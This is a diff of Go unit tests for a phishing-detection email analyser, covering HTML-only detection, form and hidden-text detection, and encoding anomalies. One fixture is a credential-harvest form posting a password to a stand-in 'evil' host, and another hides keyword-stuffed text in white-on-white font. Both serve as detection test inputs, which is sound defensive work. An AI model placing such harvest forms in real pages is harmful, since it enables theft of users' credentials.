@@ -10,20 +10,24 @@ import (
 func TestExtractBodyStructural_HTMLOnly(t *testing.T) {
 	t.Parallel()
 
-	// HTML part with no real plain-text alternative => html_only.
-	msg := &contractsk.AnalysisHeadersMessage{
-		BodyHTML: `<html><body><p>Click <a href="http://x">here</a></p></body></html>`,
-	}
-	got := extractBodyStructural(msg, "")
+	// HTML part whose plain body SVC-02 synthesised (PlainSynthesised=true) =>
+	// html_only: there was no genuine text/plain alternative.
+	got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{
+		BodyHTML:         `<html><body><p>Click <a href="http://x">here</a></p></body></html>`,
+		BodyPlain:        "Click here",
+		PlainSynthesised: true,
+	}, "")
 	if !got.HTMLOnly {
-		t.Errorf("expected HTMLOnly=true with no plain part")
+		t.Errorf("expected HTMLOnly=true when the plain part was synthesised from HTML")
 	}
 
-	// Same HTML but with a genuine, distinct plain part => NOT html_only.
-	msg.BodyPlain = "Hello, please review the attached invoice and reply by Friday."
-	got = extractBodyStructural(msg, "")
+	// Same HTML but with a genuine plain part (PlainSynthesised=false) => NOT html_only.
+	got = extractBodyStructural(&contractsk.AnalysisHeadersMessage{
+		BodyHTML:  `<html><body><p>Click <a href="http://x">here</a></p></body></html>`,
+		BodyPlain: "Hello, please review the attached invoice and reply by Friday.",
+	}, "")
 	if got.HTMLOnly {
-		t.Errorf("expected HTMLOnly=false when a meaningful plain part exists")
+		t.Errorf("expected HTMLOnly=false when a genuine (non-synthesised) plain part exists")
 	}
 }
 
@@ -145,41 +149,62 @@ func TestExtractBodyStructural_HiddenTextFalsePositives(t *testing.T) {
 	})
 }
 
-func TestExtractBodyStructural_HTMLOnlySynthesisedPlain(t *testing.T) {
+func TestExtractBodyStructural_HTMLOnlyDrivenByPlainSynthesised(t *testing.T) {
 	t.Parallel()
 
-	// SVC-02 synthesises BodyPlain from the HTML when the message had no genuine
-	// text/plain part (parser.go: BodyPlain = HTMLToText(html)), so a "plain" part
-	// whose words equal the stripped HTML means the message is effectively
-	// HTML-only and MUST be flagged. (A genuine, DISTINCT plain alternative is
-	// covered by TestExtractBodyStructural_HTMLOnly above and is NOT flagged.)
-	sentence := "Your invoice is ready, please sign in to review it."
+	html := `<html><body><p>Your invoice is ready, please sign in.</p></body></html>`
+
+	// PlainSynthesised=true + an HTML part => html_only. SVC-04 trusts the parser's
+	// flag (A1) instead of re-deriving the synthesis by re-stripping the HTML —
+	// which diverged on <style>/<script>/entities and silently dropped the signal.
+	// The content of BodyPlain is irrelevant under the new logic.
 	got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{
-		BodyHTML:  "<html><body><p>" + sentence + "</p></body></html>",
-		BodyPlain: sentence,
+		BodyHTML:         html,
+		BodyPlain:        "Your invoice is ready, please sign in.",
+		PlainSynthesised: true,
 	}, "")
 	if !got.HTMLOnly {
-		t.Errorf("a plain part that merely mirrors the stripped HTML is the synthesised HTML-only case and must be flagged")
+		t.Errorf("PlainSynthesised + HTML must be flagged HTMLOnly")
 	}
 
-	// A whitespace-only "plain" part alongside HTML is the synthesised-empty case
-	// and MUST still be flagged HTML-only.
+	// PlainSynthesised=false (a genuine plain part) => NOT html_only.
 	got = extractBodyStructural(&contractsk.AnalysisHeadersMessage{
-		BodyHTML:  "<html><body><p>" + sentence + "</p></body></html>",
-		BodyPlain: "   \n\t  ",
+		BodyHTML:  html,
+		BodyPlain: "Your invoice is ready, please sign in.",
 	}, "")
-	if !got.HTMLOnly {
-		t.Errorf("a whitespace-only plain part with HTML must be flagged HTMLOnly")
+	if got.HTMLOnly {
+		t.Errorf("a genuine plain part (PlainSynthesised=false) must not be HTMLOnly")
 	}
 
-	// A "plain" part that is only markup with no letters/digits collapses to empty
-	// and is likewise the effectively-empty (HTML-only) case.
+	// PlainSynthesised=true but NO recognisable HTML document => not html_only
+	// (hasHTML is false), so the flag alone cannot trip it.
 	got = extractBodyStructural(&contractsk.AnalysisHeadersMessage{
-		BodyHTML:  "<html><body><p>" + sentence + "</p></body></html>",
-		BodyPlain: "<><>  <>",
+		BodyPlain:        "plain only",
+		PlainSynthesised: true,
 	}, "")
-	if !got.HTMLOnly {
-		t.Errorf("a no-letters plain part with HTML must be flagged HTMLOnly")
+	if got.HTMLOnly {
+		t.Errorf("PlainSynthesised without an HTML part must not be HTMLOnly")
+	}
+}
+
+func TestExtractBodyStructural_FormInNonAllowlistedHTML(t *testing.T) {
+	t.Parallel()
+	// S7: a credential-harvest <form> (and a hidden <font> block) built only from
+	// tags OUTSIDE reHTMLTag's structural allowlist must STILL be detected — the
+	// old code gated form/hidden-text detection on reHTMLTag and silently produced
+	// all-false body signals for such payloads.
+	got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{
+		BodyHTML: `<form action="http://evil/steal"><input name="pw"></form>`,
+	}, "")
+	if !got.HasForm {
+		t.Errorf("a <form>-only HTML body (no allowlisted tag) must be flagged HasForm")
+	}
+
+	got = extractBodyStructural(&contractsk.AnalysisHeadersMessage{
+		BodyHTML: `<font style="color:#ffffff;background:#ffffff">stuffed keywords</font>`,
+	}, "")
+	if !got.HasHiddenText {
+		t.Errorf("a white-on-white <font>-only body must be flagged HasHiddenText")
 	}
 }
 
@@ -234,11 +259,51 @@ func TestExtractBodyStructural_EncodingAnomalyCharsetMismatch(t *testing.T) {
 
 func TestExtractBodyStructural_EncodingAnomalyControlChars(t *testing.T) {
 	t.Parallel()
-	// A burst of NUL/control bytes is anomalous for human-readable mail.
-	body := "hi" + strings.Repeat("\x00\x01\x02", 50)
+	// A burst of NUL/control bytes across a long-enough body is anomalous.
+	body := strings.Repeat("normal readable copy ", 12) + strings.Repeat("\x00\x01\x02", 40)
 	got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{BodyPlain: body}, "utf-8")
 	if !got.EncodingAnomaly {
-		t.Errorf("expected EncodingAnomaly for high control-char density")
+		t.Errorf("expected EncodingAnomaly for high control-char density over a long body")
+	}
+
+	// S6: a short body with one stray control byte must NOT trip the ratio (1/31 =
+	// 3.2% > 2% but below the length floor) — that was a false positive on benign
+	// short messages.
+	got = extractBodyStructural(&contractsk.AnalysisHeadersMessage{
+		BodyPlain: "hello team, see attached\x0cthanks",
+	}, "utf-8")
+	if got.EncodingAnomaly {
+		t.Errorf("a single control byte in a short body must not trip EncodingAnomaly")
+	}
+}
+
+func TestExtractBodyStructural_EncodingAnomalyLatin1NotFlagged(t *testing.T) {
+	t.Parallel()
+	// S4: iso-8859-1 / latin-1 legitimately carry printable 0x80-0xFF bytes
+	// (accented Western-European copy) — NOT an anomaly, unlike a true 7-bit
+	// us-ascii claim.
+	for _, cs := range []string{"iso-8859-1", "latin-1", "ISO-8859-1"} {
+		got := extractBodyStructural(&contractsk.AnalysisHeadersMessage{
+			BodyPlain: "Gruesse und vielen Dank fuer die Zahlung — pagué la facturación",
+		}, cs)
+		if got.EncodingAnomaly {
+			t.Errorf("charset %q with accented body must not be an EncodingAnomaly", cs)
+		}
+	}
+}
+
+func TestBodyCharsetOf(t *testing.T) {
+	t.Parallel()
+	// S5: the body-part charset (BodyCharset) is preferred; ContentCharset (the
+	// top-level Content-Type, empty for multipart mail) is only the fallback.
+	if got := bodyCharsetOf(&contractsk.AnalysisHeadersMessage{BodyCharset: "us-ascii", ContentCharset: "utf-8"}); got != "us-ascii" {
+		t.Errorf("BodyCharset must win, got %q", got)
+	}
+	if got := bodyCharsetOf(&contractsk.AnalysisHeadersMessage{ContentCharset: "utf-8"}); got != "utf-8" {
+		t.Errorf("ContentCharset fallback expected, got %q", got)
+	}
+	if got := bodyCharsetOf(nil); got != "" {
+		t.Errorf("nil msg must yield empty charset, got %q", got)
 	}
 }
 
